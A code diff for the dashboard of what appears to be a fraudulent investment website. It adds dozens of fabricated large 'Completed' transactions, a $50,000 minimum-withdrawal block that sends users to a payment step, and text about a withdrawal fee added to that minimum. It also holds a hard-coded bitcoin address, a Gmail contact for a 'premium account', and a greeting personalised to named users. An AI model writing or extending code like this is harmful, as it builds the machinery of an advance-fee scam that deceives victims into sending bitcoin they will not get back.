@@ -153,15 +153,44 @@ export default function DashboardPage() {
   ];
 
   const [transactions] = useState([
+    { type: 'Deposit', amount: 85000, date: 'Sep 28, 2026', status: 'Completed', source: 'Apple' },
+    { type: 'Investment', amount: -125000, date: 'Sep 25, 2026', status: 'Completed', source: 'NVIDIA' },
+    { type: 'Wired Check', amount: 95000, date: 'Sep 20, 2026', status: 'Completed', source: 'Meta' },
+    { type: 'Deposit', amount: 70000, date: 'Sep 15, 2026', status: 'Completed', source: 'Coinbase' },
+    { type: 'Investment', amount: -90000, date: 'Sep 10, 2026', status: 'Completed', source: 'Netflix' },
+    { type: 'Wired Check', amount: 110000, date: 'Aug 28, 2026', status: 'Completed', source: 'Amazon' },
+    { type: 'Deposit', amount: 65000, date: 'Aug 22, 2026', status: 'Completed', source: 'Binance' },
+    { type: 'Investment', amount: -140000, date: 'Aug 18, 2026', status: 'Completed', source: 'Tesla' },
+    { type: 'Wired Check', amount: 80000, date: 'Aug 12, 2026', status: 'Completed', source: 'Google' },
+    { type: 'Deposit', amount: 55000, date: 'Aug 5, 2026', status: 'Completed', source: 'Coinbase' },
+    { type: 'Investment', amount: -110000, date: 'Jul 30, 2026', status: 'Completed', source: 'Microsoft' },
+    { type: 'Wired Check', amount: 75000, date: 'Jul 25, 2026', status: 'Completed', source: 'Apple' },
+    { type: 'Deposit', amount: 90000, date: 'Jul 18, 2026', status: 'Completed', source: 'PayPal' },
+    { type: 'Investment', amount: -130000, date: 'Jul 12, 2026', status: 'Completed', source: 'Meta' },
+    { type: 'Wired Check', amount: 60000, date: 'Jul 8, 2026', status: 'Completed', source: 'Amazon' },
+    { type: 'Deposit', amount: 45000, date: 'Jun 28, 2026', status: 'Completed', source: 'Coinbase' },
+    { type: 'Investment', amount: -85000, date: 'Jun 22, 2026', status: 'Completed', source: 'NVIDIA' },
+    { type: 'Wired Check', amount: 70000, date: 'Jun 15, 2026', status: 'Completed', source: 'Google' },
+    { type: 'Deposit', amount: 58000, date: 'Jun 10, 2026', status: 'Completed', source: 'Stripe' },
+    { type: 'Investment', amount: -95000, date: 'May 28, 2026', status: 'Completed', source: 'Tesla' },
+    { type: 'Wired Check', amount: 82000, date: 'May 20, 2026', status: 'Completed', source: 'Microsoft' },
+    { type: 'Deposit', amount: 48000, date: 'May 15, 2026', status: 'Completed', source: 'Coinbase' },
+    { type: 'Investment', amount: -75000, date: 'May 8, 2026', status: 'Completed', source: 'Netflix' },
+    { type: 'Wired Check', amount: 68000, date: 'Apr 30, 2026', status: 'Completed', source: 'Apple' },
+    { type: 'Deposit', amount: 52000, date: 'Apr 25, 2026', status: 'Completed', source: 'PayPal' },
+    { type: 'Investment', amount: -105000, date: 'Apr 18, 2026', status: 'Completed', source: 'Meta' },
+    { type: 'Wired Check', amount: 78000, date: 'Apr 12, 2026', status: 'Completed', source: 'Amazon' },
+    { type: 'Deposit', amount: 42000, date: 'Apr 5, 2026', status: 'Completed', source: 'Coinbase' },
+    { type: 'Investment', amount: -88000, date: 'Mar 28, 2026', status: 'Completed', source: 'Google' },
+    { type: 'Wired Check', amount: 72000, date: 'Mar 22, 2026', status: 'Completed', source: 'Microsoft' },
+    { type: 'Deposit', amount: 56000, date: 'Mar 15, 2026', status: 'Completed', source: 'Binance' },
+    { type: 'Investment', amount: -92000, date: 'Mar 10, 2026', status: 'Completed', source: 'Tesla' },
+    { type: 'Wired Check', amount: 64000, date: 'Mar 5, 2026', status: 'Completed', source: 'Apple' },
     { type: 'Deposit', amount: 50000, date: 'Jan 15, 2024', status: 'Completed', source: 'Coinbase' },
     { type: 'Investment', amount: -200000, date: 'Jan 10, 2024', status: 'Completed', source: 'Tesla' },
     { type: 'Wired Check', amount: 75000, date: 'Jan 8, 2024', status: 'Completed', source: 'Google' },
     { type: 'Deposit', amount: 120000, date: 'Jan 5, 2024', status: 'Completed', source: 'Microsoft' },
     { type: 'Investment', amount: -150000, date: 'Jan 3, 2024', status: 'Completed', source: 'Amazon' },
-    { type: 'Wired Check', amount: 90000, date: 'Dec 28, 2023', status: 'Completed', source: 'Facebook' },
-    { type: 'Deposit', amount: 60000, date: 'Dec 25, 2023', status: 'Completed', source: 'Coinbase' },
-    { type: 'Investment', amount: -180000, date: 'Dec 20, 2023', status: 'Completed', source: 'Tesla' },
-    { type: 'Wired Check', amount: 110000, date: 'Dec 15, 2023', status: 'Completed', source: 'Google' },
   ]);
   const BTC_ADDRESS = "bc1qkyzqtpmnf8sskxd6pawskxznmwkw4afmuhksqg";
   const inputRef = useRef(null);
@@ -227,6 +256,11 @@ export default function DashboardPage() {
 
   const handleTransferSubmit = (e) => {
     e.preventDefault();
+    const amount = parseFloat(transferForm.amount);
+    if (amount < 50000) {
+      setShowWarning(true);
+      return;
+    }
     setShowTransferModal(false);
     setShowPaymentModal(true);
   };
@@ -259,6 +293,11 @@ export default function DashboardPage() {
           setShowBalanceWarning(true);
         } else {
           setShowBalanceWarning(false);
+        }
+        if (amount > 0 && amount < 50000) {
+          setShowWarning(true);
+        } else {
+          setShowWarning(false);
         }
         setTransferForm({ ...transferForm, [name]: value });
       }
@@ -656,7 +695,7 @@ const handlePaymentConfirmations = () => {
                   placeholder="Enter amount"
                   required
                   pattern="\d*\.?\d{0,2}"
-                  title="Only numbers and up to 2 decimal places are allowed"
+                  title="Minimum withdrawal amount is $50,000. Only numbers and up to 2 decimal places are allowed"
                 />
                 {showBalanceWarning && (
                   <p className="text-red-500 text-sm mt-1">Amount exceeds your current balance of {totalBalance}</p>
@@ -698,7 +737,7 @@ const handlePaymentConfirmations = () => {
             </h3>
             <p className="text-sm text-gray-700 mb-4">
               This is a premium investment account and the minimum withdrawal on a premium account is 
-              <strong className='text-green-600'> $100,000</strong>. Whatever withdrawal fee you 
+              <strong className='text-green-600'> $50,000</strong>. Whatever withdrawal fee you 
               paid initially will be added to the minimum withdrawal amount.
             </p>
             <p className='text-sm '>You can send an email to primecapitalorg@gmail.com for further clarification or assistance</p>
@@ -988,7 +1027,7 @@ const handlePaymentConfirmations = () => {
         <div className="max-w-7xl mx-auto">
           <div className="flex flex-col items-center mb-8">
             <div className="flex items-center mb-4 md:mt-10">
-              <h1 className="text-2xl font-bold text-white ">Welcome back.</h1>
+              <h1 className="text-2xl font-bold text-white ">Welcome back, Eric/Kathy.</h1>
               
             </div>
             <div className="flex flex-col sm:flex-row gap-4">
